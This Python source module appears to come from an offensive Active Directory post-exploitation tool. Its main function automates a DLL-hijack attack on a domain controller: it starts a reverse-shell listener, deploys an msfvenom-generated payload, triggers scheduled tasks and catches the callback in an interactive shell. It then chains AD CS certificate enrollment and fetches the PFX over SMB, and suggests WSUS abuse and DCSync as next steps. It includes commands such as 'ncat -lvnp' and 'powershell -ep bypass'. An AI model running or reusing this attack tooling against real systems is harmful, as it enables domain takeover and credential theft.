from __future__ import annotations

import json
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import TYPE_CHECKING

from admapper.creds.common import pick_dc_ip, resolve_dc_fqdn
from admapper.postex.creds import resolve_winrm_cred
from admapper.postex.deploy import deploy_dll_hijack
from admapper.postex.monitor_log import (
    build_monitor_log_script,
    monitor_log_shows_new_activity,
    read_monitor_log,
    resolve_monitor_log_path,
)
from admapper.postex.listener import ReverseShellListener, ShellCapture, start_listener
from admapper.postex.listener_marker import (
    is_port_in_use,
    read_listener_marker,
    update_listener_connected,
    write_listener_marker,
)
from admapper.postex.payload import PayloadMode
from admapper.postex.pe_arch import TargetArch
from admapper.postex.shell_client import parse_shell_username
from admapper.support.output import print_info, print_success, print_warning
from admapper.winrm.client import WinRMClient
from admapper.winrm.factory import winrm_client_for_cred

if TYPE_CHECKING:
    from admapper.support.session import Session


@dataclass
class RunResult:
    deploy_remote_path: str
    run_as_user: str
    callback_ip: str = ""
    shell_output: str = ""
    monitor_excerpt: str = ""
    shell_connected: bool = False
    enroll_success: bool = False
    pfx_remote: str = ""
    enroll_log_excerpt: str = ""
    errors: list[str] = field(default_factory=list)


def _winrm_client_from_cred(cred, session: Session | None = None) -> WinRMClient:
    return winrm_client_for_cred(cred, session)


def _poll_enroll_outcome(
    client: WinRMClient,
    *,
    dns_name: str,
    timeout: int,
    deploy_marker: str = "",
    expect_user: str = "",
    drop_path: str = r"C:\ProgramData",
) -> tuple[bool, str, list[str]]:
    """Wait for remote PFX; read enroll.log after deploy marker."""
    from admapper.adcs.enroll import parse_enroll_log

    drop = drop_path.rstrip("\\/")
    remote_pfx = f"{drop}\\{dns_name}.pfx"
    log_path = f"{drop}\\enroll.log"
    safe_pfx = remote_pfx.replace("'", "''")
    safe_log = log_path.replace("'", "''")
    deadline = time.time() + max(timeout, 0)
    last_log = ""
    while time.time() < deadline:
        proc = client.execute(f"Test-Path -LiteralPath '{safe_pfx}'", shell="powershell")
        if "True" in (proc.stdout or ""):
            return True, last_log, []
        log_proc = client.execute(
            f"if(Test-Path -LiteralPath '{safe_log}'){{Get-Content -LiteralPath '{safe_log}' -Tail 60}}",
            shell="powershell",
        )
        last_log = (log_proc.stdout or "").strip()
        if deploy_marker and deploy_marker not in last_log:
            time.sleep(20)
            continue
        if deploy_marker and "=== enroll" not in last_log.lower():
            time.sleep(20)
            continue
        status = parse_enroll_log(
            last_log,
            since_marker=deploy_marker or None,
            expect_user=expect_user or None,
        )
        if status.success:
            return True, last_log, []
        if status.present and status.errors and "=== enroll" in last_log.lower():
            return False, last_log, status.errors
        time.sleep(20)
    status = parse_enroll_log(
        last_log,
        since_marker=deploy_marker or None,
        expect_user=expect_user or None,
    )
    errors = status.errors or (
        ["PFX not issued within timeout — wait for the scheduled task to run"]
        if not status.success
        else []
    )
    return False, last_log, errors


def _target_ips(session: Session) -> set[str]:
    ips: set[str] = set()
    dc = pick_dc_ip(session)
    if dc:
        ips.add(dc)
    if session.workspace:
        from admapper.stores.hosts import HostsStore

        for host in HostsStore(session.workspaces, session.workspace.name).list():
            if host.address:
                ips.add(host.address)
    return ips


def _load_scan(ws_path: Path) -> dict:
    path = ws_path / "postex_scan.json"
    if not path.is_file():
        return {}
    return json.loads(path.read_text(encoding="utf-8"))


def _enter_interactive_repl(
    listener: ReverseShellListener,
    session: Session,
    *,
    lport: int,
    op_id: str | None = None,
    auto_chain: bool | None = None,
    expected_user: str | None = None,
    skip_post_connect: bool = False,
) -> None:
    """Drop into the reverse-shell REPL on an already-connected listener."""
    from admapper.postex.shell_client import ReverseShellRepl

    print_success("entering interactive reverse-shell REPL (Ctrl+C to exit)")
    try:
        ReverseShellRepl(
            listener,
            session,
            lport=lport,
            op_id=op_id,
            auto_chain=auto_chain,
            expected_user=expected_user,
        ).interact(skip_post_connect=skip_post_connect)
    except KeyboardInterrupt:
        print_info("REPL interrupted by user")


def _print_shell_next_steps(session: Session, *, username: str) -> None:
    """Actionable next steps after pivot shell (no password-based secretsdump)."""
    if session.workspace is None:
        return
    workspace = session.workspace.name
    domain = session.workspace.domain or "DOMAIN"
    ws_path = session.workspaces.path_for(workspace)
    print_info("next admapper commands:")
    wsus_path = ws_path / "wsus_ops.json"
    if wsus_path.is_file():
        try:
            import json

            data = json.loads(wsus_path.read_text(encoding="utf-8"))
            for item in data.get("opportunities") or []:
                if str(item.get("id")) == "wsus-004" and item.get("ready"):
                    print_info(
                        f"    admapper postex wsus run -w {workspace}  "
                        "(WSUS cert chain — no shell password needed)"
                    )
                    break
        except (OSError, json.JSONDecodeError):
            pass
    print_info(
        f"    admapper postex shell -w {workspace} --lport <callback-port>  "
        "(reconnect if listener still up)"
    )
    print_info(
        f"    DCSync needs DA/hash — {username} has no password from reverse shell; "
        f"do not use secretsdump.py {domain}/{username}@<DC> without -hashes or -k"
    )


def _on_shell_captured(
    session: Session,
    *,
    deploy_run_as_user: str,
    probe_output: str,
    enroll_template: str,
    lport: int,
    op_id: str | None,
    listener: ReverseShellListener,
    auto_chain: bool | None,
    lightweight_followup: bool = False,
) -> tuple[bool, str, str]:
    """Handle pivot intel, workspace finalize, and listener marker after callback."""
    print_success("shell probe output:")
    print_info(probe_output[:1200])
    _handle_pivot_shell(
        session,
        deploy_run_as_user,
        probe_output,
        enroll_template=enroll_template,
        lightweight=lightweight_followup,
    )
    update_listener_connected(
        session,
        port=lport,
        peer=listener.capture.peer,
        op_id=op_id or "",
    )

    shell_user = deploy_run_as_user
    parsed = parse_shell_username(probe_output)
    if parsed:
        shell_user = parsed

    if shell_user and shell_user != "unknown":
        print_success(f"shell user: {shell_user}")

    return True, probe_output, shell_user


def _external_handler_active(
    session: Session,
    lport: int,
    *,
    no_listener: bool,
    payload_mode: str,
    dry_run: bool,
) -> bool:
    if no_listener or dry_run or payload_mode != "shell":
        return False
    marker = read_listener_marker(session)
    if not marker or int(marker.get("port", 0)) != lport:
        return False
    return is_port_in_use(lport)


def emit_shell_timeout_diagnostics(
    *,
    callback_ip: str,
    lport: int,
    arch: str,
    task_triggers: int,
    monitor_log_tail: str = "",
    export_name: str = "PreUpdateCheck",
) -> None:
    print_warning("shell timeout — check:")
    lowered = monitor_log_tail.lower()
    if "error code: 193" in lowered or "not a valid win32 application" in lowered:
        alt = "x86" if arch != "x86" else "x64"
        print_warning(
            f"  · PE bitness mismatch (error 193) — applier rejected {arch} DLL; retry --arch {alt}"
        )
    print_info(f"  · outbound TCP {lport} from DC to {callback_ip or '<LHOST>'} allowed?")
    print_info("  · try --lport 443 or --lport 80 (common allowed ports)")
    if "error code: 193" not in lowered:
        print_info(f"  · try --arch x64 if target is a DC (current arch: {arch})")
    if task_triggers:
        print_info(
            f"  · task triggered {task_triggers} time(s) — payload loads but shell not reaching listener"
        )
    if task_triggers and monitor_log_tail:
        lowered = monitor_log_tail.lower()
        export_lower = export_name.lower()
        called_export = (
            f"calling '{export_lower}" in lowered or f'calling "{export_lower}' in lowered
        )
        load_errors = ("error code:", "not found in", "failed to load")
        if called_export and not any(err in lowered for err in load_errors):
            print_info(
                "  · export returned but no callback — rebuild with latest dllgen; "
                "if persists try --lport 443 / 80 (egress filter)"
            )


def _prompt_extend_listen(*, task_triggers: int) -> bool:
    if task_triggers:
        print_info("task trigger detected — task IS running, shell not connecting back")
    print_info("keep listener alive? (Ctrl+C to exit, Enter to wait another 180s)")
    try:
        input()
        return True
    except KeyboardInterrupt:
        print_info("listener stopped by user")
        return False


def _poll_marker_connected(session: Session, lport: int, timeout: float) -> bool:
    deadline = time.time() + max(timeout, 0)
    while time.time() < deadline:
        marker = read_listener_marker(session)
        if (
            marker
            and int(marker.get("port", 0)) == lport
            and marker.get("connected")
        ):
            return True
        time.sleep(min(5.0, max(deadline - time.time(), 0.5)))
    return False


def _poll_wait_window(
    *,
    listener: ReverseShellListener | None,
    client: WinRMClient,
    script: str,
    deploy_run_as_user: str,
    wait_seconds: int,
    external_handler: bool,
    session: Session,
    lport: int,
    log_baseline: str = "",
) -> tuple[bool, str, int]:
    """Poll monitor logs and listener for one wait window."""
    deadline = time.time() + max(wait_seconds, 0)
    last_out = ""
    poll_interval = 20
    task_triggers = 0
    while time.time() < deadline:
        remaining = int(deadline - time.time())
        if listener and listener.capture.connected:
            listener.wait_probe(timeout=min(max(remaining, 1), 15.0))
            return True, last_out, task_triggers
        if external_handler and _poll_marker_connected(session, lport, min(poll_interval, remaining)):
            return True, last_out, task_triggers
        try:
            last_out = read_monitor_log(client, script)
            if monitor_log_shows_new_activity(last_out, log_baseline):
                lowered = last_out.lower()
                if "error code: 126" not in lowered or deploy_run_as_user.lower() in lowered:
                    task_triggers += 1
                    print_info("service log: new task activity")
        except Exception as exc:
            print_warning(f"monitor poll: {exc}")

        if listener:
            snap = listener.wait(timeout=min(poll_interval, max(remaining, 1)))
            if snap.connected:
                return True, last_out, task_triggers
        elif external_handler:
            if _poll_marker_connected(session, lport, min(poll_interval, max(remaining, 1))):
                return True, last_out, task_triggers

        if remaining <= 0:
            break
        print_info(f"waiting for shell / task ({remaining}s left) …")
        time.sleep(min(poll_interval, remaining))
    return False, last_out, task_triggers


def _resolve_enroll_targets(session: Session) -> tuple[str, str, str]:
    """Return (dns_fqdn, ca_host, ca_name) from workspace intel."""
    domain = (session.workspace.domain if session.workspace else None) or ""
    if not domain:
        raise RuntimeError("no domain set in workspace — cannot infer enrollment targets")
    ws_path = session.workspaces.path_for(session.workspace.name)  # type: ignore[union-attr]
    dc_ip = pick_dc_ip(session)
    dns = resolve_dc_fqdn(str(ws_path), domain, fallback_ip=dc_ip) or f"dc01.{domain.lower()}"
    prefix = domain.split(".")[0] if domain else ""
    ca_name = f"{prefix or 'AD'}-DC01-CA"
    inv_path = ws_path / "adcs_inventory.json"
    if inv_path.is_file():
        try:
            inv = json.loads(inv_path.read_text(encoding="utf-8"))
            ca_name = str(inv.get("ca_name") or ca_name)
        except (json.JSONDecodeError, OSError):
            pass
    return dns, dns, ca_name


def _handle_pivot_shell(
    session: Session,
    run_as_user: str,
    probe_output: str,
    *,
    enroll_template: str = "User",
    lightweight: bool = False,
) -> None:
    """After shell as pivot target, show next escalate step and local AD CS enroll script."""
    parsed = parse_shell_username(probe_output)
    effective_user = parsed or run_as_user
    if not effective_user or effective_user == "unknown":
        return
    whoami = probe_output.lower()
    if run_as_user.lower() not in whoami and parsed.lower() not in whoami:
        if parsed:
            effective_user = parsed
        else:
            return
    try:
        from admapper.escalate.analyze import mark_user_owned

        if lightweight:
            mark_user_owned(session, effective_user, refresh=False, analyze=False)
            print_info(
                f"pivot → {effective_user} (shell only — no password/hash in credentials.json)"
            )
            print_info(
                "LDAP phases bind as another owned user until you add creds for the pivot "
                "(loot hash in shell, or admapper creds add)"
            )
            print_info(
                "next: admapper postex shell -w <workspace> --lport <port>  "
                "then run enum from the shell"
            )
            return

        from admapper.adcs.enroll import build_local_enroll_powershell, load_enroll_profile
        from admapper.adcs.runner import run_certipy_enrollment
        from admapper.escalate.analyze import run_escalate_analysis

        ws_path = session.workspaces.path_for(session.workspace.name)  # type: ignore[union-attr]
        certs_dir = ws_path / "certs"
        certs_dir.mkdir(parents=True, exist_ok=True)
        enroll_dns, enroll_ca_host, enroll_ca_name = _resolve_enroll_targets(session)
        template = enroll_template or "User"
        profile = load_enroll_profile(
            session,
            template=template,
            dns_name=enroll_dns,
            ca_host=enroll_ca_host,
            ca_name=enroll_ca_name,
            run_as_user=effective_user,
        )
        ps = build_local_enroll_powershell(
            template=template,
            dns_name=enroll_dns,
            ca_host=enroll_ca_host,
            ca_name=enroll_ca_name,
            profile=profile,
            run_as_user=effective_user,
        )
        script = certs_dir / f"enroll_{effective_user.replace('.', '_')}.ps1"
        script.write_text(ps + "\n", encoding="utf-8")
        print_info(f"pivot shell as {effective_user} — NEXT: WSUS + vulnerable template cert chain")
        print_info("in shell: powershell -ep bypass -File <drop_path>\\<enroll_script>")
        print_info("or: admapper postex run --mode enroll (DLL auto-enroll on task trigger)")
        run_escalate_analysis(session, pivot_user=effective_user)
        result = run_certipy_enrollment(session, finding_id="adcs-002", dns_name=enroll_dns)
        if result.success and result.pfx_path:
            print_success(f"cert issued → {result.pfx_path}; next: admapper wsus / pywsus")
    except Exception as exc:
        print_warning(f"pivot shell follow-up: {exc}")


def run_dll_hijack(
    session: Session,
    *,
    op_id: str | None = None,
    cred_id: str | None = None,
    lhost: str | None = None,
    lport: int = 4444,
    payload_dll: Path | None = None,
    wait_seconds: int = 180,
    dry_run: bool = False,
    arch: TargetArch | None = None,
    use_ncat: bool = False,
    no_listener: bool = False,
    payload_mode: PayloadMode = "shell",
    enroll_template: str = "User",
    enroll_dns: str | None = None,
    enroll_ca_name: str | None = None,
    enroll_ca_host: str | None = None,
    auto_chain: bool | None = None,
    keep_listener: bool = False,
    max_wait_cycles: int | None = None,
    auto_trigger_task: bool = False,
    generator: str = "msfvenom",
    interactive: bool = True,
) -> RunResult:
    """Fully automated: detect VPN IP, msfvenom, listener, deploy, poll, catch shell."""
    if session.workspace is None:
        raise RuntimeError("no active workspace")

    from admapper.models.workspace import OperationMode
    from admapper.support.connectivity import (
        TargetUnreachableError,
        format_unreachable_message,
        require_target_reachable,
    )

    if not dry_run and session.workspace.mode == OperationMode.AUTO:
        try:
            require_target_reachable(session)
        except TargetUnreachableError as exc:
            raise RuntimeError(format_unreachable_message(exc)) from exc

    default_dns, default_ca_host, default_ca_name = _resolve_enroll_targets(session)
    enroll_dns = enroll_dns or default_dns
    enroll_ca_host = enroll_ca_host or default_ca_host
    enroll_ca_name = enroll_ca_name or default_ca_name

    ws_path = session.workspaces.path_for(session.workspace.name)
    exclude = _target_ips(session)
    listener: ReverseShellListener | None = None
    external_handler = _external_handler_active(
        session,
        lport,
        no_listener=no_listener,
        payload_mode=payload_mode,
        dry_run=dry_run,
    )

    try:
        if not no_listener and not dry_run and payload_mode == "shell":
            if external_handler:
                print_info(
                    f"external handler detected on :{lport} — upload only, handler will catch callback"
                )
            elif use_ncat:
                print_info(f"external listener required: ncat -lvnp {lport} on your LHOST")
            else:
                print_info(f"Starting listener on port {lport}")
                print_info(
                    f"starting built-in reverse-shell listener on 0.0.0.0:{lport} "
                    "(set ADMAPPER_LHOST)"
                )
                listener = start_listener(lport, use_ncat=use_ncat)
                if isinstance(listener, ReverseShellListener):
                    from admapper.postex.shell_client import register_active_listener

                    register_active_listener(session.workspace.name, lport, listener)
                    write_listener_marker(
                        session,
                        port=lport,
                        op_id=op_id or "",
                        connected=False,
                    )

        deploy = deploy_dll_hijack(
            session,
            op_id=op_id,
            cred_id=cred_id,
            lhost=lhost,
            lport=lport,
            payload_dll=payload_dll,
            dry_run=dry_run,
            exclude_ips=exclude,
            arch=arch,
            payload_mode=payload_mode,
            enroll_template=enroll_template,
            enroll_dns=enroll_dns,
            enroll_ca_name=enroll_ca_name,
            enroll_ca_host=enroll_ca_host,
            generator=generator,  # type: ignore[arg-type]
        )

        if dry_run:
            return RunResult(
                deploy_remote_path=deploy.remote_path,
                run_as_user=deploy.run_as_user,
            )

        print_info(
            f"waiting up to {wait_seconds}s for task '{deploy.task_name}' (runs as {deploy.run_as_user})"
        )

        scan = _load_scan(ws_path)
        finding = (scan.get("findings") or [{}])[0]
        drop_path = str(finding.get("drop_path") or r"C:\ProgramData")
        monitor_path = resolve_monitor_log_path(scan, drop_path)

        cred = resolve_winrm_cred(
            session,
            shell_user=deploy.shell_user,
            cred_id=cred_id,
            host=str(scan.get("dc_ip") or ""),
        )
        client = _winrm_client_from_cred(cred, session)

        script = build_monitor_log_script(monitor_path, drop_path)
        shell_connected = False
        shell_output = ""
        shell_user = deploy.run_as_user
        callback_ip = deploy.callback_ip or lhost or ""
        last_out = ""
        task_triggers = 0
        wait_cycle = 0
        if auto_trigger_task and deploy.task_name:
            try:
                client.execute(f'schtasks /run /tn "{deploy.task_name}"', shell="cmd")
                print_info(f"triggered scheduled task: {deploy.task_name}")
            except Exception as exc:  # noqa: BLE001
                print_warning(f"task trigger failed ({deploy.task_name}): {exc}")
        log_baseline = read_monitor_log(client, script)
        interactive_listener: ReverseShellListener | None = None
        if listener and isinstance(listener, ReverseShellListener):
            interactive_listener = listener

        while not shell_connected:
            shell_connected, last_out, task_triggers = _poll_wait_window(
                listener=listener,
                client=client,
                script=script,
                deploy_run_as_user=deploy.run_as_user,
                wait_seconds=wait_seconds,
                external_handler=external_handler,
                session=session,
                lport=lport,
                log_baseline=log_baseline,
            )
            if shell_connected:
                break
            print_warning(f"no reverse shell within {wait_seconds}s — task may need more time")
            if last_out:
                print_info("service log (last poll):")
                for line in last_out.splitlines()[-8:]:
                    print_info(f"  {line}")
                if "error code: 193" in last_out.lower():
                    print_warning(
                        "PE bitness mismatch (error 193) — rebuild payload with --arch x86 "
                        "(32-bit applier cannot load x64 DLL)"
                    )
            emit_shell_timeout_diagnostics(
                callback_ip=callback_ip,
                lport=lport,
                arch=deploy.target_arch,
                task_triggers=task_triggers,
                monitor_log_tail=last_out,
            )
            wait_cycle += 1
            extend = keep_listener and (
                max_wait_cycles is None or wait_cycle < max_wait_cycles
            )
            extend = extend or (
                interactive and _prompt_extend_listen(task_triggers=task_triggers)
            )
            if extend:
                if keep_listener and max_wait_cycles is not None:
                    remaining = max_wait_cycles - wait_cycle
                    print_info(
                        f"dashboard listener: waiting another {wait_seconds}s "
                        f"({remaining} cycle(s) left)"
                    )
                write_listener_marker(
                    session,
                    port=lport,
                    op_id=op_id or "",
                    connected=False,
                )
                continue
            break

        cap = listener.capture if listener else ShellCapture()
        if shell_connected and external_handler and not cap.connected:
            marker = read_listener_marker(session) or {}
            peer = marker.get("peer") or "unknown"
            print_success(f"shell connected on external handler from {peer}")
            print_info(
                f"use the handler terminal for REPL — or: admapper postex shell -w {session.workspace.name}"
            )
        elif cap.connected and interactive_listener:
            shell_connected, shell_output, shell_user = _on_shell_captured(
                session,
                deploy_run_as_user=deploy.run_as_user,
                probe_output=cap.output,
                enroll_template=enroll_template,
                lport=lport,
                op_id=op_id,
                listener=interactive_listener,
                auto_chain=auto_chain,
                lightweight_followup=not interactive,
            )
        elif keep_listener and listener:
            print_info("still listening for reverse shell ...")
            cap = listener.wait(timeout=30.0)
            if cap.connected and interactive_listener:
                shell_connected, shell_output, shell_user = _on_shell_captured(
                    session,
                    deploy_run_as_user=deploy.run_as_user,
                    probe_output=cap.output,
                    enroll_template=enroll_template,
                    lport=lport,
                    op_id=op_id,
                    listener=interactive_listener,
                    auto_chain=auto_chain,
                    lightweight_followup=not interactive,
                )

        enroll_success = False
        enroll_log_excerpt = ""
        enroll_errors: list[str] = []
        drop_base = drop_path.rstrip("\\/")
        pfx_remote = f"{drop_base}\\{enroll_dns}.pfx"
        if payload_mode == "enroll" and not dry_run:
            enroll_success, enroll_log_excerpt, enroll_errors = _poll_enroll_outcome(
                client,
                dns_name=enroll_dns,
                timeout=wait_seconds,
                deploy_marker=deploy.enroll_deploy_marker,
                expect_user=deploy.run_as_user,
                drop_path=drop_path,
            )
            if enroll_success:
                print_success(f"enroll issued PFX on target → {pfx_remote}")
                try:
                    from admapper.adcs.runner import fetch_pfx_via_smb

                    local_pfx = fetch_pfx_via_smb(
                        session, remote_name=f"{enroll_dns}.pfx", drop_path=drop_path
                    )
                    if local_pfx:
                        print_success(f"PFX downloaded → {local_pfx}")
                except Exception as exc:
                    print_warning(f"PFX SMB fetch: {exc}")
                if session.workspace and deploy.run_as_user not in session.workspace.owned_users:
                    from admapper.escalate.analyze import mark_user_owned, record_escalation_step

                    mark_user_owned(session, deploy.run_as_user, refresh=False)
                    record_escalation_step(
                        session,
                        action="enroll_hijack",
                        detail=f"enroll PFX as {deploy.run_as_user}",
                    )
                    session.persist_workspace()
            else:
                for err in enroll_errors:
                    print_warning(f"enroll: {err}")
                if enroll_log_excerpt:
                    print_info("enroll.log (tail):")
                    for line in enroll_log_excerpt.splitlines()[-10:]:
                        print_info(f"  {line}")

        if (
            shell_connected
            and interactive_listener
            and interactive_listener.capture.connected
            and not dry_run
            and payload_mode == "shell"
        ):
            chain = auto_chain
            if chain is None and session.workspace and interactive:
                from admapper.support.session import OperationMode

                chain = session.workspace.mode == OperationMode.AUTO
            if chain and shell_user and shell_user != "unknown":
                from admapper.engage.auto import finalize_postex_shell

                finalize_postex_shell(
                    session,
                    username=shell_user,
                    probe_output=shell_output,
                    auto_chain=True,
                )
            _print_shell_next_steps(session, username=shell_user or deploy.run_as_user)
            if interactive:
                _enter_interactive_repl(
                    interactive_listener,
                    session,
                    lport=lport,
                    op_id=op_id,
                    auto_chain=auto_chain,
                    expected_user=shell_user or deploy.run_as_user,
                    skip_post_connect=True,
                )
            else:
                workspace = session.workspace.name if session.workspace else ""
                print_success(
                    f"Interactive shell ready — use the shell prompt below or: "
                    f"admapper postex shell -w {workspace} --lport {lport}"
                )

        return RunResult(
            deploy_remote_path=deploy.remote_path,
            run_as_user=deploy.run_as_user,
            callback_ip=callback_ip,
            shell_output=shell_output,
            monitor_excerpt=last_out,
            shell_connected=shell_connected,
            enroll_success=enroll_success,
            pfx_remote=pfx_remote if enroll_success else "",
            enroll_log_excerpt=enroll_log_excerpt,
            errors=[] if enroll_success or payload_mode != "enroll" else enroll_errors,
        )
    finally:
        if listener is not None:
            keep_open = (
                not interactive
                and isinstance(listener, ReverseShellListener)
                and listener.capture.connected
            )
            if keep_open:
                listener.persist()
                if session.workspace and isinstance(listener, ReverseShellListener):
                    from admapper.postex.shell_client import register_active_listener

                    register_active_listener(session.workspace.name, lport, listener)
            else:
                if session.workspace and isinstance(listener, ReverseShellListener):
                    from admapper.postex.shell_client import unregister_active_listener

                    unregister_active_listener(session.workspace.name, lport)
                listener.close()
